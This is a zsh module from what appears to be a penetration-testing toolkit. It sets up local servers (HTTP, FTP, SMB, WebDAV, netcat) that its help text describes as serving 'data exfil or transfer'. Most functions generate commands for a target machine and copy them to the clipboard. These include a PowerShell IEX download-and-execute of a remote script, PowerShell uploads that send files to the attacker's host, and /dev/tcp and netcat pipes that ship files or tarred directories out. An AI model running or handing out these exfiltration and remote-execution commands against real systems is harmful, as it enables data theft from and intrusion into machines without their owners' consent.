#!/usr/bin/env zsh

############################################################# 
# nb-srv
#############################################################
nb-srv-help() {
    cat << "DOC" | bat --plain --language=help

nb-srv
-------
The srv namespace provides commands for hosting local services such as web, ftp, smb and other services for data exfil or transfer.

Commands to just host a server
------------------------------
nb-srv-web              hosts a python web server in server dir
nb-srv-tftp             starts the atftpd service in /srv/tftp
nb-srv-smtp             hosts a python smtp server in current dir
nb-srv-updog            hosts a updog web server in server dir
nb-srv-ngrok            hosts a ngrok web server in server dir

Commands to download a file from server
---------------------------------------
nb-srv-smb-null         hosts an impacket smb server in current dir
nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
nb-srv-ftp-down         hosts a python ftp server in current dir
nb-srv-scp-down         download a file using SCP

Commands to upload a file to a server
-------------------------------------
nb-srv-ftp-up           hosts a python ftp server in current dir
nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
nb-srv-smb-http         hosts an SMB over HTTP server with WebDav in current dir
nb-srv-nc-b64-web       hosts a netcat server > decode b64 file in current dir
nb-srv-scp-up           upload a file using SCP

Commands to upload a file to a server on LINUX
----------------------------------------------
nb-srv-nc-tar           hosts a netcat server > tar file in current dir
nb-srv-nc-file          hosts a netcat server > file in current dir
nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir

DOC
}

nb-srv-install() {
    __info "Running $0..."
    __pkgs netcat atftpd 
    __pkgs php python python-pip python-smb impacket python-updog

    if ! command -v pyftpdlib &> /dev/null
    then
        __info "pyftpdlib is not installed. Installing..."
        sudo pip3 install pyftpdlib
    fi

    if ! command -v uploadserver &> /dev/null
    then
        __info "uploadserver is not installed. Installing..."
        sudo pip3 install uploadserver
    fi

    if ! command -v wsgidav &> /dev/null
    then
        __info "wsgidav is not installed. Installing..."
        sudo apt install python3-wsgidav
    fi

    if ! command -v cheroot &> /dev/null
    then
        __info "cheroot is not installed. Installing..."
        sudo pip3 install cheroot
    fi
}

nb-srv-uploadserver() {
  nb-vars-set-lhost
  nb-vars-set-lport
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND1="IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')"
  __COMMAND2="Invoke-FileUpload -Uri http://${__LHOST}:${__LPORT}/upload -File $path"
  echo "$__COMMAND2" | wl-copy
  echo "$__COMMAND1" | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"

  echo
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	sudo python3 -m uploadserver
  popd &> /dev/null
}

nb-srv-ftp-down() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  echo
  __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"

  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	sudo python3 -m pyftpdlib --port 21
  popd &> /dev/null
}

nb-srv-scp-down() {
  nb-vars-set-user
  nb-vars-set-rhost
  local filename && __askvar filename "FILENAME"
  local path && __askvar path "FULL_PATH_INCLUDING_FILENAME"

  print -z "scp ${__USER}@${__RHOST}:$path $filename"
}

nb-srv-scp-up() {
  nb-vars-set-user
  nb-vars-set-rhost
  local filename && __askvar filename "FILENAME"
  local path && __askvar path "DESTINATION_OF_UPLOADED_FILE"

  print -z "scp $filename ${__USER}@${__RHOST}:$path"
}

nb-srv-ftp-up() {
  nb-vars-set-lhost
  local filename && __askvar filename "SAVE_AS_FILENAME"
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND="(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')"
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"

  echo
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
  sudo python3 -m pyftpdlib --port 21 --write
  popd &> /dev/null
}

nb-srv-smb-null() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  __COMMAND="copy \\${__LHOST}\share\\$filename"
  echo "$__COMMAND" | wl-copy
  __info "Command to use on a target system copied to clipboard"
  __info "The server can authenticate without credentials."
  __info "You can mount the share on the box and copy files to it using commands:"
  __ok "  net use x:\\\\\\${__LHOST}\\share"
  __ok "  cmd /c \"copy filename.txt X:\\\""
  pushd "$HOME/desktop/server" &> /dev/null
  echo
  __info "Serving content at $(hip) in $PWD"
	sudo smbserver.py -smb2support share ./
  popd &> /dev/null
}

nb-srv-smb-http() {
  nb-vars-set-lhost
  local path && __askvar path "FULL_PATH_TO_FILE"

  echo
  __COMMAND1="dir \\${__LHOST}\DavWWWRoot"
  __COMMAND2="copy $path \\${__LHOST}\DavWWWRoot"
  echo $__COMMAND2 | wl-copy
  echo $__COMMAND1 | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"

  echo
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
  popd &> /dev/null
}

nb-srv-smb-auth() {
  nb-vars-set-lhost
  local filename && __askvar filename "FILENAME"

  __COMMAND1="net use n: \\${__LHOST}\share /user:test test"
  __COMMAND2="copy n:\\$filename"
  echo "$__COMMAND2" | wl-copy
  echo "$__COMMAND1" | wl-copy
  __info "2 Commands to use on a target system copied to clipboard"
  __info "The server will use the credentials guest/guest for authentication."
  __info "You can mount the share on the box and copy files to it using commands:"
  __ok "  net use x:\\\\\\${__LHOST}\\share /user:guest guest"
  __ok "  cmd /c \"copy filename.txt X:\\\""

  # New versions of Windows block unauthenticated guest access, to bypass set username and pass
  pushd "$HOME/desktop/server" &> /dev/null
  echo
  __info "Serving content at $(hip) in $PWD"
	sudo smbserver.py -smb2support -username guest -password guest share ./ 
  popd &> /dev/null
}

nb-srv-web() {
  nb-vars-set-lport

  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	python3 -m http.server ${__LPORT}
  popd &> /dev/null
}

nb-srv-ngrok() {
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
  ngrok http 4444
  popd &> /dev/null
}

nb-srv-tftp() {
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	sudo service atftpd start
  popd &> /dev/null
}

nb-srv-smtp() {
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
	sudo python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
  popd &> /dev/null
}

nb-srv-updog() {
  pushd "$HOME/desktop/server" &> /dev/null
  __info "Serving content at $(hip) in $PWD"
  sudo updog -p 443 --ssl --password $(__rand 10)
  popd &> /dev/null
}

nb-srv-nc-b64-web() {
    nb-vars-set-lport
    nb-vars-set-lport
    local path && __askvar path "FULL_PATH_TO_FILE"

    echo
    __COMMAND1="$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))"
    __COMMAND2="Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \\$b64"
    echo "$__COMMAND2" | wl-copy
    echo "$__COMMAND1" | wl-copy
    __info "2 Commands to use on a target system copied to clipboard"

    pushd "$HOME/desktop/server" &> /dev/null
    nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt
    popd &> /dev/null
}

nb-srv-nc-tar() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    nc -nvlp ${__LPORT} | tar xfv -
}

nb-srv-nc-file() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    nc -nvlp ${__LPORT} -w 5 > incoming
}

nb-srv-nc-b64() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __COMMAND="openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
    echo "$__COMMAND" | wl-copy
    __info "Command to use on a target system copied to clipboard"

    nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt
}
